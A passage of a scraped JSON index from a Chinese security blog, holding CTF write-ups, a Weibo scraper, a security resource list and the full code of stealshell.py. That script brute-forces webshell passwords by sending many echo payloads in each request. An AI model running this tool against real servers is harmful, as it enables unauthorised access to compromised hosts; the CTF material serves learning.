爆破的想法，但看起来也不可操作。\n投入太多时间了，还是等官方WP吧：）\n","permalink":"https://ret2neo.cn/post/180325qwbwp/","summary":"MISC Welcome 使用stegsolve打开，在Analyse-\u0026gt;Stereogram Solver 处改变偏移即可。\nCrypto streamgame1 streamgame1.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from flag import flag assert flag.startswith(\u0026#34;flag{\u0026#34;) assert flag.endswith(\u0026#34;}\u0026#34;) assert len(flag)==25 def lfsr(R,mask): output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff i=(R\u0026amp;mask)\u0026amp;0xffffff lastbit=0 while i!=0: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 output^=lastbit return (output,lastbit) R=int(flag[5:-1],2) mask = 0b1010011000100011100 f=open(\u0026#34;key\u0026#34;,\u0026#34;ab\u0026#34;) for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp \u0026lt;\u0026lt; 1)^out f.","title":"第二届强网杯全国网络安全挑战赛"},{"content":"baby_N1ES 题目提供两个文件，challenge.py和N1ES.py 。\n虽然似乎在模仿AES，但是实际上明文和密文是一一映射的，复杂度不是恶心的100^48 而只是100*48 ，穷举是很快的。一个小障碍是N1ES.py 第71行的L, R = R, L ，这导致了明文的[0:8] 、[8:16]、[16:24]、[24:32]、[32:40]、[40:48] 分别对应的是密文的[8:16]、[0:8] 、[24:32]、[16:24]、[40:48]、 [32:40] ，写穷举脚本时需要注意。\ncrack.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import base64,string,N1ES key = \u0026#34;wxy191iss00000000000cute\u0026#34; c = base64.b64decode(\u0026#34;HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx\u0026#34;) n1es = N1ES.N1ES(key) f=\u0026#34;\u0026#34; for i in xrange(3): for j in xrange(16): for k in string.printable: s=\u0026#34;x\u0026#34;*i*16+\u0026#34;x\u0026#34;*j+k+\u0026#34;x\u0026#34;*(48-i*16-j-1) e=n1es.encrypt(s) check=c[i*16+j+8]==e[i*16+j+8] if j\u0026lt;8 else c[i*16+j-8]==e[i*16+j-8] if check: f+=k break print f # N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/} challenge.py 1 2 3 4 5 6 7 from N1ES import N1ES import base64 key = \u0026#34;wxy191iss00000000000cute\u0026#34; n1es = N1ES(key) flag = \u0026#34;N1CTF{*****************************************}\u0026#34; cipher = n1es.encrypt(flag) print base64.b64encode(cipher) # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx N1ES.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 # -*- coding: utf-8 -*- def round_add(a, b): f = lambda x, y: x + y - 2 * (x \u0026amp; y) res = \u0026#39;\u0026#39; for i in range(len(a)): res += chr(f(ord(a[i]), ord(b[i]))) return res def permutate(table, block): return list(map(lambda x: block[x], table)) def string_to_bits(data): data = [ord(c) for c in data] l = len(data) * 8 result = [0] * l pos = 0 for ch in data: for i in range(0,8): result[(pos\u0026lt;\u0026lt;3)+i] = (ch\u0026gt;\u0026gt;i) \u0026amp; 1 pos += 1 return result s_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 89, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156, 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27] def generate(o): k = permutate(s_box,o) b = [] for i in range(0, len(k), 7): b.append(k[i:i+7] + [1]) c = [] for i in range(32): pos = 0 x = 0 for j in b[i]: x += (j\u0026lt;\u0026lt;pos) pos += 1 c.append((0x10001**x) % (0x7f)) return c class N1ES: def __init__(self, key): if (len(key) != 24 or isinstance(key, bytes) == False ): raise Exception(\u0026#34;key must be 24 bytes long\u0026#34;) self.key = key self.gen_subkey() def gen_subkey(self): o = string_to_bits(self.key) k = [] for i in range(8): o = generate(o) k.extend(o) o = string_to_bits([chr(c) for c in o[0:24]]) self.Kn = [] for i in range(32): self.Kn.append(map(chr, k[i * 8: i * 8 + 8])) return def encrypt(self, plaintext): if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False): raise Exception(\u0026#34;plaintext must be a multiple of 16 in length\u0026#34;) res = \u0026#39;\u0026#39; for i in range(len(plaintext) / 16): block = plaintext[i * 16:(i + 1) * 16] L = block[:8] R = block[8:] for round_cnt in range(32): L, R = R, (round_add(L, self.Kn[round_cnt])) L, R = R, L res += L + R return res 签到 IRC频道公告有字符串TjFDVEZ7V2VsYzBtZV90b19OMUNURl8yMDE4fQ ,base64解码后即flag。\n","permalink":"https://ret2neo.cn/post/180310n1ctfwp/","summary":"baby_N1ES 题目提供两个文件，challenge.py和N1ES.py 。\n虽然似乎在模仿AES，但是实际上明文和密文是一一映射的，复杂度不是恶心的100^48 而只是100*48 ，穷举是很快的。一个小障碍是N1ES.py 第71行的L, R = R, L ，这导致了明文的[0:8] 、[8:16]、[16:24]、[24:32]、[32:40]、[40:48] 分别对应的是密文的[8:16]、[0:8] 、[24:32]、[16:24]、[40:48]、 [32:40] ，写穷举脚本时需要注意。\ncrack.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import base64,string,N1ES key = \u0026#34;wxy191iss00000000000cute\u0026#34; c = base64.b64decode(\u0026#34;HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx\u0026#34;) n1es = N1ES.N1ES(key) f=\u0026#34;\u0026#34; for i in xrange(3): for j in xrange(16): for k in string.printable: s=\u0026#34;x\u0026#34;*i*16+\u0026#34;x\u0026#34;*j+k+\u0026#34;x\u0026#34;*(48-i*16-j-1) e=n1es.encrypt(s) check=c[i*16+j+8]==e[i*16+j+8] if j\u0026lt;8 else c[i*16+j-8]==e[i*16+j-8] if check: f+=k break print f # N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/} challenge.","title":"N1CTF baby_N1ES writeup"},{"content":" 项目地址在 Github\n人生活在社区里，对一个常使用微博的人来说，微博记录和反映了他在一段时间内所接触的信息，思考的问题和表达的观点，是值得研究的。如果这个研究对象是一个优秀的人，这里面的价值可能比想象要大。\n很显然，要做成收集整理一个人所有的微博 这件事，首先是收集，其次是整理。\n收集主要想到有三种方式：\n找现成工具（无趣，暂不考虑）。 在https://m.weibo.cn/u/14015127xxx 页面一直按END 键，然后页面会不断异步发送请求以增加页面内容，直到全部内容都被获取。 可以看到第二种方法中的请求是向https://m.weibo.cn/api/container/getIndex?type=uid\u0026amp;value=1401527xxx\u0026amp;containerid=1076031401527xxx\u0026amp;page=1 发送GET请求，只需迭代page的参数即可得到所有数据。 方法二实践 用如下简单脚本模拟按键行为，泡杯茶观察成果。\n1 2 3 4 5 6 7 8 9 10 11 import win32api import time print time.asctime() cnt=0 while 1: cnt+=1 win32api.keybd_event(35, 0, 0, 0) #35 stands for \u0026#34;END\u0026#34; key; 0 means hold down win32api.keybd_event(35, 0, 1, 0) # 1 means hold up print cnt, time.sleep(2) print time.asctime() 发现按了几十下页面就开始不变化了，观察请求发现都是发给page=50的，想必是做了限制，最多获取50条记录，暂告失败。\n方法三实践 要用这个方法首先最好知道总共有多少page，用二分法手动测，很快就能发现目标用户共有1542个page的记录，然后写个脚本dump下这些响应，保存成json文件，以供后面处理即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from requests import * from time import * import json print asctime() url=\u0026#34;https://m.weibo.cn/api/container/getIndex?type=uid\u0026amp;value=1401527xxx\u0026amp;containerid=1076031401527xxx\u0026amp;page=\u0026#34; for i in range(1543,1,-1): u=url+str(i) f=open(\u0026#34;result/%d.json\u0026#34;%i,\u0026#39;w+\u0026#39;) f.write(get(u).content) f.close() sleep(2) if i%50==0: sleep(3) print asctime() 处理json 分析响应结构，提取关键信息，构造文件汇总即可。代码见 GitHub 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 #coding:utf8 # Github 项目已删，成果暂存 https://findneo.github.io/p/tkposts.html import json import re def parse_cards_to_html(data_cards): \u0026#34;\u0026#34;\u0026#34; 微博API (https://m.weibo.cn/api/container/getIndex?type=uid\u0026amp;value=1401527553\u0026amp;containerid=1076031401527553\u0026amp;page=1) 返回的一个字典，形如 {\tok: 1, data: {\tcardlistInfo: {...}, cards: [\t{\tcard_type: 9,\titemid: foo,\tscheme: post链接, mblog: {created_at: post发表时间,\t..., text: post内容,\t..., retweeted_status: {created_at: repost发表时间,...,text: repost内容,...,} }, show_type: 0 }, {...},... ], showAppTips: 0, scheme: foo } } 本函数的功能是将cards中每一个表示post的card里的时间和内容，以及repost的时间和内容(如果有的话)，提取出来， 构造成HTML语句。 \u0026#34;\u0026#34;\u0026#34; ret=\u0026#34;\u0026#34; for card in data_cards: if card[\u0026#34;card_type\u0026#34;]==9: # card_type==9 说明当前card是一个post is_repost=0 post=card[\u0026#34;mblog\u0026#34;] post_time=post[\u0026#34;created_at\u0026#34;] post_text=post[\u0026#34;text\u0026#34;] ret0=\u0026#34;\u0026lt;p\u0026gt;\u0026lt;code\u0026gt;\u0026lt;br /\u0026gt;%s\u0026lt;/code\u0026gt;\u0026lt;br /\u0026gt;%s\u0026lt;/p\u0026gt;\u0026#34;%(post_time,post_text) if \u0026#34;retweeted_status\u0026#34; in post.keys(): # 当前card中有retweeted_status键说明这是一个repost is_repost=1 repost=post[\u0026#34;retweeted_status\u0026#34;] repost_time=repost[\u0026#34;created_at\u0026#34;] repost_text=repost[\u0026#34;text\u0026#34;] ret1=\u0026#34;\\n\\t\u0026lt;blockquote\u0026gt;\u0026lt;p\u0026gt;\u0026lt;code\u0026gt;%s\u0026lt;/code\u0026gt;\u0026lt;br /\u0026gt;%s\u0026lt;/p\u0026gt;\u0026lt;/blockquote\u0026gt;\u0026#34;%(repost_time,repost_text) ret=ret+ret0+ret1 if is_repost else ret+ret0 ret=ret+\u0026#34;\u0026lt;hr /\u0026gt;\\n\u0026#34; return ret def comment_img_in_html(file_name): \u0026#34;\u0026#34;\u0026#34; 因为教主post中时有图片，15000+条post里的图片数量相当可观（而且很多加载不出来）， 为了提高加载速度，这个函数将成品中的img标签全部注释掉。 \u0026#34;\u0026#34;\u0026#34; with open(file_name) as old_f,open(\u0026#34;noimg_%s\u0026#34;%file_name,\u0026#34;w+\u0026#34;) as new_f: for line in old_f.readlines(): res=re.sub(\u0026#39;(\u0026lt;img.*?\u0026gt;)\u0026#39;,r\u0026#34;\u0026lt;!--\\1--\u0026gt;\u0026#34;,line) new_f.write(res) def main(): with open(\u0026#34;tkposts.html\u0026#34;,\u0026#34;w+\u0026#34;) as f: head=\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;html{background:#f2f2f2;font-size:16px;font-family:Monaco}\u0026lt;/style\u0026gt;\u0026lt;title\u0026gt;TK POSTS\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\\n\u0026#39; f.write(head.encode(\u0026#39;utf8\u0026#39;)) for i in xrange(1,1543): data = json.load(open(\u0026#34;%d.json\u0026#34;%i)) if data[\u0026#34;ok\u0026#34;]!=1: print \u0026#34;%d.json no data\u0026#34;%i continue msg_list=data[\u0026#34;data\u0026#34;][\u0026#34;cards\u0026#34;] msg_html=parse_cards_to_html(msg_list) f.write(msg_html.encode(\u0026#39;utf8\u0026#39;)) tail=\u0026#34;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34; f.write(tail.encode(\u0026#39;utf8\u0026#39;)) comment_img_in_html(\u0026#34;tkposts.html\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: \u0026#34;\u0026#34;\u0026#34; 截至 2018/3/8 下午一时许，教主在新浪微博上共发表约13831条状态， 其中约6157条是转发自己或其他人的状态并评论。 第一条发布在2010-05-21，内容是 “刚看到的：2007年德国《自然科学》杂志的一篇文章指出， 最近感染过弓形虫的女性怀孕生男孩的概率为60.8%。也就是说， 感染弓形虫有助于生儿子——不过，不知道是需要在感染状态才行，还是治好了也行。 ”， 可以看到风格很早就形成了，幽默感，批判性，科学性具存，这就是让人乐于追随学习的地方。 \u0026#34;\u0026#34;\u0026#34; main() 收获 了解了正则表达式的backreference和lazy mode 。 使用 json.load(file) 将json文件转换成字典。 数据编码问题可能导致写文件报错，可用f.write(data.encode('utf8')) 。 用with open(\u0026quot;f1\u0026quot;) as f1,open(\u0026quot;f2\u0026quot;) as f2: 打开多个文件。 每一个人作为数字公民的部分可能最后并不能留下太多痕迹，而且这些痕迹可能非常脆弱。当然，话说回来，这同线下生活也是相似的。 ","permalink":"https://ret2neo.cn/post/180309retrieveweiboposts/","summary":"项目地址在 Github\n人生活在社区里，对一个常使用微博的人来说，微博记录和反映了他在一段时间内所接触的信息，思考的问题和表达的观点，是值得研究的。如果这个研究对象是一个优秀的人，这里面的价值可能比想象要大。\n很显然，要做成收集整理一个人所有的微博 这件事，首先是收集，其次是整理。\n收集主要想到有三种方式：\n找现成工具（无趣，暂不考虑）。 在https://m.weibo.cn/u/14015127xxx 页面一直按END 键，然后页面会不断异步发送请求以增加页面内容，直到全部内容都被获取。 可以看到第二种方法中的请求是向https://m.weibo.cn/api/container/getIndex?type=uid\u0026amp;value=1401527xxx\u0026amp;containerid=1076031401527xxx\u0026amp;page=1 发送GET请求，只需迭代page的参数即可得到所有数据。 方法二实践 用如下简单脚本模拟按键行为，泡杯茶观察成果。\n1 2 3 4 5 6 7 8 9 10 11 import win32api import time print time.asctime() cnt=0 while 1: cnt+=1 win32api.keybd_event(35, 0, 0, 0) #35 stands for \u0026#34;END\u0026#34; key; 0 means hold down win32api.keybd_event(35, 0, 1, 0) # 1 means hold up print cnt, time.sleep(2) print time.asctime() 发现按了几十下页面就开始不变化了，观察请求发现都是发给page=50的，想必是做了限制，最多获取50条记录，暂告失败。\n方法三实践 要用这个方法首先最好知道总共有多少page，用二分法手动测，很快就能发现目标用户共有1542个page的记录，然后写个脚本dump下这些响应，保存成json文件，以供后面处理即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from requests import * from time import * import json print asctime() url=\u0026#34;https://m.","title":"收集整理一个人所有的微博"},{"content":" 项目地址在 Github：https://github.com/findneo/Newbie-Security-List\nNewbie-Security-List 一桌菜，十几盘，有荤有素，有凉有热，怎么吃呢？你可以找一盘看起来好吃的，也可以找一盘离自己近的，都行。但是，得动筷子。不管怎么吃，最重要的是得动筷子。学技术也是一样。\n有的人死活不动筷子，还不断念叨：“我要开始吃了。我马上就要开始吃了。我只要开始吃就能吃饱。我吃饱了就不饿了。你能不能告诉我该先吃哪一盘？先冷盘后热菜再喝汤这样是不是最好？但是我听说广东人都是先喝汤？这盘菜会不会太远了？这盘会不会太油腻？我吃饱了万一想拉屎你们这里有厕所吗？我真的马上就要开始吃了……为什么我现在还是饿？你能不能帮帮我？”\nby tombkeeper @2017-11-28\n乌云 在线漏洞库/知识库 https://wooyun.shuimugan.com/ http://cb.drops.wiki/ http://wooyun.chamd5.org/ http://wooyun.jozxing.cc/ https://web.archive.org/web/20160628133257/http://www.wooyun.org:80/ （GFW） 在线知识库 https://superkieran.github.io/WooyunDrops/#!/ https://wooyun.js.org/ https://web.archive.org/web/20160628084846/http://drops.wooyun.org:80/ （GFW） 在线漏洞库 http://bug.p0sec.net/ https://web.archive.org/web/20160625075226/http://www.wooyun.org:80/bugs （GFW） 本地搭建 B/S型 https://github.com/hanc00l/wooyun_public\n硬盘搜索型 链接: WooYun漏洞、知识库收集(超详细版) 密码: 28gr\neverything : search file by name on disk.\nagentransack/FileLocatorPro : search file by content on disk。\nCTF BREAK \u0026amp; WATCH 文档 https://beginners.re/ https://leanpub.com/web-hacking-101 https://ctf-wiki.github.io/ctf-wiki/index.html https://www.pediy.com/kssd/ https://paper.seebug.org/ http://evilcos.me/security_skill_tree_basic/index.html https://book.nmask.cn/ GitHub https://github.com/jekil/awesome-hacking/ https://github.com/ctfs/ https://github.com/joe-shenouda/awesome-cyber-skills https://github.com/CHYbeta/Web-Security-Learning https://github.com/tom0li/collection-document 安全导航 https://navisec.it/ http://www.itxueke.com/SecNavi/ http://shentoushi.top/ http://secnav.dropsec.xyz/ 其他优秀资源 https://speakerdeck.com/search?utf8=%E2%9C%93\u0026amp;q=ctf https://gotyour.pw/ https://skills.bugbank.cn/ https://hackmethod.com/roadmap/ https://highon.coffee/ https://silic.wiki/doku.php https://learnxinyminutes.com/ http://www.opensecuritytraining.info/ http://www.fuzzysecurity.com/index.html https://pentesterlab.com/bootcamp http://liveoverflow.com/ GET HANDS DIRTY 练习平台 http://shell-storm.org/repo/CTF/ https://ctftime.org/ https://www.vulnhub.com/ https://exploit-exercises.com/ http://cryptopals.com/ http://overthewire.org https://pwnhub.cn/index https://cmdchallenge.com/ https://www.hackthissite.org/ https://microcorruption.com/login http://smashthestack.org/ http://pwnable.kr/ https://pwnable.tw/ http://www.underthewire.tech/ http://www.freebuf.com/sectool/4708.html http://www.hetianlab.com/ ONLINE JUDGE https://ringzer0team.com/ https://www.wechall.net/ https://backdoor.sdslabs.co/challenges https://www.jarvisoj.com/ https://ctf.katsudon.org/ctf4u/ https://www.onlinectf.com/challenges/ http://ksnctf.sweetduet.info/ http://ctf.nuptsast.com/ https://ctf.hackmethod.com/ http://oj.xctf.org.cn/ http://ctf.bugku.com/ http://ctf.rookiehacker.org/ http://www.shiyanbar.com/ctf/practice http://hackinglab.cn/ https://hackme.inndy.tw/ https://ctflearn.com/ https://ctf.katsudon.org/ FOR FUN http://www.heibanke.com/lesson/crawler_ex00/ http://web.onlinectf.com/cutezombie/web-app/ http://riddle.arthurluk.net/pocket.php http://fun.coolshell.cn/ http://monyer.com/game/game1/ 博客 HACKERS https://whereisk0shl.top/ https://www.leavesongs.com/ http://www.cnblogs.com/iamstudy https://sigterm.ch/ http://xlab.tencent.com/cn/ https://strcpy.me/ https://ricterz.me/ http://www.blue-lotus.net/ http://217.logdown.com/ http://sh3ll.me/ http://jiangjiawei.pw/blog/ https://dog.xmu.edu.cn/ https://chybeta.github.io/ https://hackfun.org/ http://www.cnblogs.com/figure9/ http://blog.csdn.net/v_july_v http://mslc.ctf.su/ MIND HACKERS https://livid.v2ex.com/ https://www.byvoid.com/zhs/ http://mindhacks.cn/ http://www.matrix67.com/blog/ http://www.ruanyifeng.com/home.html http://www.yinwang.org/ https://www.scotthyoung.com/blog/ https://blog.youxu.info/ https://program-think.blogspot.com/ 工具 搜索 https://google.com/ https://www.exploit-db.com/google-hacking-database/ http://search.chongbuluo.com/ http://www.xilinjie.com/ http://webcache.googleusercontent.com/search?q=cache:https://findneo.github.io https://web.archive.org/web/*/https://findneo.github.io 电子书籍 http://www.banshujiang.cn/ http://bestcbooks.com/ https://salttiger.com/archives/ https://www.it-ebooks.info/ http://www.oreilly.com/programming/free/ http://www.sxyj.net/ https://www.jiumodiary.com/ 安全相关 https://tools.pediy.com/ https://down.52pojie.cn/Tools/ https://www.ctftools.com/down/ https://github.com/zardus/ctf-tools https://github.com/P1kachu/v0lt https://www.zoomeye.org/ https://www.shodan.io/ https://fofa.so/ https://quipqiup.com/ http://factordb.com/ https://koczkatamas.github.io/ ","permalink":"https://ret2neo.cn/post/180308newbiesecuritylist/","summary":"项目地址在 Github：https://github.com/findneo/Newbie-Security-List\nNewbie-Security-List 一桌菜，十几盘，有荤有素，有凉有热，怎么吃呢？你可以找一盘看起来好吃的，也可以找一盘离自己近的，都行。但是，得动筷子。不管怎么吃，最重要的是得动筷子。学技术也是一样。\n有的人死活不动筷子，还不断念叨：“我要开始吃了。我马上就要开始吃了。我只要开始吃就能吃饱。我吃饱了就不饿了。你能不能告诉我该先吃哪一盘？先冷盘后热菜再喝汤这样是不是最好？但是我听说广东人都是先喝汤？这盘菜会不会太远了？这盘会不会太油腻？我吃饱了万一想拉屎你们这里有厕所吗？我真的马上就要开始吃了……为什么我现在还是饿？你能不能帮帮我？”\nby tombkeeper @2017-11-28\n乌云 在线漏洞库/知识库 https://wooyun.shuimugan.com/ http://cb.drops.wiki/ http://wooyun.chamd5.org/ http://wooyun.jozxing.cc/ https://web.archive.org/web/20160628133257/http://www.wooyun.org:80/ （GFW） 在线知识库 https://superkieran.github.io/WooyunDrops/#!/ https://wooyun.js.org/ https://web.archive.org/web/20160628084846/http://drops.wooyun.org:80/ （GFW） 在线漏洞库 http://bug.p0sec.net/ https://web.archive.org/web/20160625075226/http://www.wooyun.org:80/bugs （GFW） 本地搭建 B/S型 https://github.com/hanc00l/wooyun_public\n硬盘搜索型 链接: WooYun漏洞、知识库收集(超详细版) 密码: 28gr\neverything : search file by name on disk.\nagentransack/FileLocatorPro : search file by content on disk。\nCTF BREAK \u0026amp; WATCH 文档 https://beginners.re/ https://leanpub.com/web-hacking-101 https://ctf-wiki.github.io/ctf-wiki/index.html https://www.pediy.com/kssd/ https://paper.seebug.org/ http://evilcos.me/security_skill_tree_basic/index.html https://book.nmask.cn/ GitHub https://github.com/jekil/awesome-hacking/ https://github.com/ctfs/ https://github.com/joe-shenouda/awesome-cyber-skills https://github.com/CHYbeta/Web-Security-Learning https://github.com/tom0li/collection-document 安全导航 https://navisec.it/ http://www.","title":"网络安全学习资料"},{"content":"思路来自爱春秋文章python之提速千倍爆破一句话 ，据说源头是吐司文章《让你的一句话爆破速度提升千倍》。\n速度提升的关键在于一次尝试提交多个可能的密码，实测在Apache+PHP下使用POST方式请求可高达四千万条密码每次（耗时约20秒，GET方式请求只能达到两百条左右），效果可以说非常惊人，如果有一个足够好的字典，那将无往不利。\n思路举例 1 2 3 4 慢速： http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22); 快速： http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);\u0026amp;findneo=echo(%22pwd:findneo%22); 用法 1 2 3 4 5 6 7 8 9 10 Usage: stealshell.py [options] Options: -h, --help display this message -u URL, --url=URL Target URL;This option must be provided to define the target (e.g. \u0026#34;http://127.0.0.1/xiao.php\u0026#34;) -m METHOD request method (support GET/POST,GET is default ) -d DICT the filename of candidate passwords (e.g. \u0026#34;shell_pass_dic.txt\u0026#34;) -n NUM the number of passwords that will be submitted in each request (219 is default) 依赖库 python2.7: requests,sys,getopt\n效果如图 代码 支持PHP和asp，asp部分没有搭环境测试，但只是payload简单替换，理论上是没有问题的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 import requests as req import sys import getopt token=\u0026#34;pwd\u0026#34; def usage(): print \u0026#34;\u0026#34;\u0026#34; ################################################################################################### This is a script used to guess the pass of webshells rapidly (up to 40M each time). It supports php\u0026amp;asp,GET\u0026amp;POST. site:\thttps://findneo.github.io/stealshell/ ################################################################################################### Usage: stealshell.py [options] Options: -h, --help\tdisplay this message -u URL, --url=URL Target URL;This option must be provided to define the target (e.g. \u0026#34;http://127.0.0.1/xiao.php\u0026#34;) -m METHOD request method (support GET/POST,GET is default ) -d DICT the filename of candidate passwords (e.g. \u0026#34;shell_pass_dic.txt\u0026#34;) -n NUM the number of passwords that will be submitted in each request (219 is default) \u0026#34;\u0026#34;\u0026#34; def get_dict(dic_name=\u0026#34;shell_pass_dic.txt\u0026#34;,pcpt=4,shell_type=\u0026#34;php\u0026#34;): with open(dic_name,\u0026#39;r\u0026#39;) as f: c=f.readlines() print \u0026#34;\\nthis dict has %d items in all\u0026#34;%len(c) cnt=len(c)/pcpt # pcpt is short for password_check_per_time sp=[] # split password by pcpt per group sp.extend([c[i*pcpt:i*pcpt+pcpt] for i in xrange(cnt)]) sp+=[c[cnt*pcpt:]] # sp: [[\u0026#39;x\\n\u0026#39;, \u0026#39;cmd\\n\u0026#39;, \u0026#39;pass\\n\u0026#39;, \u0026#39;pwd\\n\u0026#39;], [\u0026#39;xiao\\n\u0026#39;, \u0026#39;584521\\n\u0026#39;, \u0026#39;nohack\\n\u0026#39;, \u0026#39;45189946\\n\u0026#39;], ...] print \u0026#34;we split it into %d groups (%d * %d + %d) and submit one group each time\\n\u0026#34;%(len(sp),cnt,pcpt,len(c)-pcpt*cnt) spd=[] execute=\u0026#34;echo\u0026#34; if shell_type==\u0026#34;php\u0026#34; else \u0026#34;response.write\u0026#34; spd.extend([{j.strip(\u0026#39;\\n\u0026#39;):\u0026#34;%s(\u0026#39;%s:%s\u0026#39;);\u0026#34;%(execute,token,j) for j in i}for i in sp]) # spd: [{\u0026#39;x\u0026#39;: \u0026#34;echo(\u0026#39;pwd:x\\n\u0026#39;);\u0026#34;, \u0026#39;pass\u0026#39;: \u0026#34;echo(\u0026#39;pwd:pass\\n\u0026#39;);\u0026#34;,...] return spd def check_pass(url,pwd_list,method): for i in pwd_list: r=req.get(url,params=i) if method==\u0026#34;GET\u0026#34; else req.post(url,data=i) print \u0026#39;.\u0026#39;, if token in r.content: print \u0026#34;\u0026#34; return r.content if __name__ == \u0026#39;__main__\u0026#39;: try: options,left_args=getopt.getopt(sys.argv[1:],\u0026#34;hu:m:d:n:\u0026#34;,[\u0026#34;help\u0026#34;,\u0026#34;url=\u0026#34;]) except Exception as e: raise e url=\u0026#34;http://127.0.0.1/xiao.php\u0026#34; method=\u0026#34;GET\u0026#34; dic_name=\u0026#34;shell_pass_dic.txt\u0026#34; pass_num=219 if not len(options): exit(usage()) for name,value in options: if name in (\u0026#34;-h\u0026#34;,\u0026#34;--help\u0026#34;): exit(usage()) elif name in (\u0026#34;-u\u0026#34;,\u0026#34;--url\u0026#34;): url=value elif name in (\u0026#34;-m\u0026#34;): method=value elif name in (\u0026#34;-d\u0026#34;): dic_name=value elif name in (\u0026#34;-n\u0026#34;): pass_num=int(value) shell_type=url[-3:] pwd_list=get_dict(dic_name=dic_name,pcpt=pass_num,shell_type=shell_type) print check_pass(url=url,pwd_list=pwd_list,method=method) ","permalink":"https://ret2neo.cn/post/180304stealshell/","summary":"思路来自爱春秋文章python之提速千倍爆破一句话 ，据说源头是吐司文章《让你的一句话爆破速度提升千倍》。\n速度提升的关键在于一次尝试提交多个可能的密码，实测在Apache+PHP下使用POST方式请求可高达四千万条密码每次（耗时约20秒，GET方式请求只能达到两百条左右），效果可以说非常惊人，如果有一个足够好的字典，那将无往不利。\n思路举例 1 2 3 4 慢速： http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22); 快速： http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);\u0026amp;findneo=echo(%22pwd:findneo%22); 用法 1 2 3 4 5 6 7 8 9 10 Usage: stealshell.py [options] Options: -h, --help display this message -u URL, --url=URL Target URL;This option must be provided to define the target (e.g. \u0026#34;http://127.0.0.1/xiao.php\u0026#34;) -m METHOD request method (support GET/POST,GET is default ) -d DICT the filename of candidate passwords (e.g. \u0026#34;shell_pass_dic.txt\u0026#34;) -n NUM the number of passwords that will be submitted in each request (219 is default) 依赖库 python2.","title":"一句话快速爆破脚本"},{"content":"中二的成长之路 我用真心对你，你却用QR敷衍我。\n附件下载\n试试QR的哈希，并且注意红字。 使用图片显示的某些信息做哈希 再次观察图片，看看不一样的颜色和字体，也许需要做一下哈希 扫描题目给的图片得到3ukka4wZf2Q9H8PEI5YKFA== ，但直接base64解码得到乱码。谷歌搜索发现可能性很多，各种尝试无果。 使用binwalk分离出压缩包。不是伪加密，爆破也无果。 经过主办方提示看看不一样的颜色和字体 注意到AES，搜索发现与今年9月份的问鼎杯CTF一道题极为相似，就是压缩包的密码经过AES加密后再进行base64编码。这样就有了基本的思路。但还缺少一些信息，比如AES采用哪种模式，key是什么，如果有IV，又会是什么。 对着三次关于哈希 